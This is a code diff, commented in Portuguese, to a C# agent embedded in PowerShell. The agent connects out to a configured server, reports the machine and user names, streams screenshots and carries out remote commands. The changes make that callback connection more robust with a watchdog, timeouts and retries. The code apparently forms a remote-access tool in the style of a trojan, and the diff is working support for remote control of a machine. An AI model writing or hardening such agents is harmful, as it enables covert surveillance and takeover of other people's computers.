@@ -311,6 +311,9 @@ if (-not ("R9KAgent" -as [type])) {
         static long lastQuality = -1;
 
         static volatile bool cursorOverride = false;
+        // --- FIX 1: sinal único de conexão morta + timestamp de pong ---
+        static volatile bool connClosed = false;
+        static DateTime lastPongTime = DateTime.MinValue;
 
         static void EnsureJpegCodec(long quality) {
             if (jpgCodec == null) {
@@ -338,8 +341,9 @@ if (-not ("R9KAgent" -as [type])) {
                 try {
                     myClient = new TcpClient();
                     myClient.NoDelay = true;
-                    myClient.SendTimeout = 2000;
-                    myClient.ReceiveTimeout = 60000;
+                    // --- FIX 2: SendTimeout folgado + ReceiveTimeout infinito (EOF é o sinal) ---
+                    myClient.SendTimeout = 30000;
+                    myClient.ReceiveTimeout = 0;
                     IAsyncResult ar = myClient.BeginConnect(IP, PORT, null, null);
                     if (!ar.AsyncWaitHandle.WaitOne(5000)) { myClient.Close(); throw new Exception("connect timeout"); }
                     myClient.EndConnect(ar);
@@ -351,18 +355,15 @@ if (-not ("R9KAgent" -as [type])) {
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
 
+                    // --- FIX 3: watchdog em connClosed + lastPongTime, sem Poll/Connected ---
+                    connClosed = false;
+                    lastPongTime = DateTime.UtcNow;
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
                     Thread tBeat = new Thread(() => HeartbeatLoop(myClient, myWriter)); tBeat.IsBackground = true; tBeat.Start();
-                    while (true) {
-                        if (myClient.Client == null) break;
-                        bool dead = false;
-                        try {
-                            if (!myClient.Client.Connected) dead = true;
-                            else if (myClient.Client.Poll(0, SelectMode.SelectRead) && myClient.Client.Available == 0) dead = true;
-                        } catch { dead = true; }
-                        if (dead) break;
-                        Thread.Sleep(500);
+                    while (!connClosed) {
+                        if ((DateTime.UtcNow - lastPongTime).TotalSeconds > 90) { connClosed = true; break; }
+                        Thread.Sleep(2000);
                     }
                 } catch {
                 } finally {
@@ -375,9 +376,18 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
+        // --- FIX 6: heartbeat com retry, 8 falhas consecutivas matam ---
         static void HeartbeatLoop(TcpClient myClient, StreamWriter myWriter) {
-            while (true) {
-                try { lock (writeLock) { myWriter.WriteLine("PING"); } } catch { break; }
+            int failCount = 0;
+            while (!connClosed) {
+                try {
+                    lock (writeLock) { myWriter.WriteLine("PING"); }
+                    failCount = 0;
+                } catch {
+                    failCount++;
+                    if (failCount > 8) { connClosed = true; break; }
+                    Thread.Sleep(2000);
+                }
                 Thread.Sleep(20000);
             }
         }
@@ -429,6 +439,7 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
+        // --- FIX 4: EOF do reader é o ÚNICO sinal de "morreu" ---
         static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
             try {
                 while (true) {
@@ -437,6 +448,7 @@ if (-not ("R9KAgent" -as [type])) {
                     ProcessCommand(cmd.Trim(), myWriter);
                 }
             } catch {}
+            connClosed = true;
             try { myClient.Close(); } catch {}
         }
 
@@ -453,23 +465,27 @@ if (-not ("R9KAgent" -as [type])) {
             }
         }
 
+        // --- FIX 5: stream com retry, 8 falhas consecutivas matam ---
         static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
-            while (myClient.Connected) {
+            int failCount = 0;
+            while (!connClosed) {
                 try {
                     if (streaming) {
                         string b64 = CaptureScreen(1440, 62);
                         if (b64 != null) {
-                            lock (writeLock) {
-                                myWriter.Write("SCREEN:");
-                                myWriter.WriteLine(b64);
-                            }
+                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
+                            failCount = 0;
                         } else {
                             Thread.Sleep(10);
                         }
                     } else {
                         Thread.Sleep(20);
                     }
-                } catch { break; }
+                } catch {
+                    failCount++;
+                    if (failCount > 8) { connClosed = true; break; }
+                    Thread.Sleep(500);
+                }
             }
         }
 
@@ -629,6 +645,8 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void ProcessCommand(string cmd, StreamWriter myWriter) {
             try {
+                // --- FIX 7: pong do servidor atualiza lastPongTime ---
+                if (cmd == "pong") { lastPongTime = DateTime.UtcNow; return; }
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; cursorOverride = false; lock (writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 if (cmd == "cursor_free") { cursorOverride = false; return; }
